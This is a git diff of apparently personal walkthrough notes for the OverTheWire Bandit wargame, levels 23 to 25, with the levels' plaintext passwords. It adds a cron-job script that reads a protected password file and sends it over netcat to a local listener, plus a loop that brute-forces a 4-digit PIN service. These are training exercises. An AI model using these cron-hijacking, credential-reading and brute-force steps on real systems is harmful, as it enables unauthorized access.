@@ -297,23 +297,69 @@ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
 
 ### Level 23
 ```bash
-ssh bandit22@bandit.labs.overthewire.org -p 2220
+ssh bandit23@bandit.labs.overthewire.org -p 2220
 # Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ls /etc/cron.d
 cat /etc/cron.d/cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
 
 # Will need to write a shell script that cats out the password file and saves it to the temp folder
-### SCRIPT
-#!/bin/bash
-touch /tmp/tmp.kd9eVN0u6z/password.txt
-cat /etc/bandit_pass/bandit24 > /tmp/tmp.kd9eVN0u6z/password.txt
-### SCRIPT
+mktemp -d
+cd # temp dir
+# Very scuffed way of doing things here. We're going to need two ssh sessions open both in the temp dir
+# ssh session 1
+nc -l -p 50860 -q 1 > password.txt < /dev/null
+# ssh session 2
+chmod 0760 # new temp directory
 touch script.sh
 chmod +x script.sh
 vim script.sh
+### SCRIPT
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 | netcat localhost 50860
+# ls -al /etc/bandit_pass > /tmp/tmp.ZnvbxGaVfo/password_perms.txt
+# cat /etc/bandit_pass/bandit24 > /tmp/tmp.kd9eVN0u6z/password.txt
+### SCRIPT
 cp script.sh run.sh
 mv run.sh /var/spool/bandit24/foo
 
-
+# password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
+
+### Level 24
+```bash
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+# password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+### script
+mktemp -d
+cd # temp dir
+touch run.sh && chmod +x run.sh  && vim run.sh
+### SCRIPT
+# This forloop creates 10000 combinations of the 4 digit password
+for i in $(seq 0 1 9);
+do
+    for j in $(seq 0 1 9);
+    do
+        for k in $(seq 0 1 9);
+        do
+            for l in $(seq 0 1 9);
+            do
+                echo "$i$j$k$l"
+                echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i$j$k$l" >> attempts.txt
+            done
+        done
+    done
+done
+cat attempts.txt | netcat localhost 30002 
+### SCRIPT
+./run.sh
+
+# Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+### Level 25
+```bash
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+# password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+ssh bandit26@localhost -p 2220 -i bandit26.sshkey
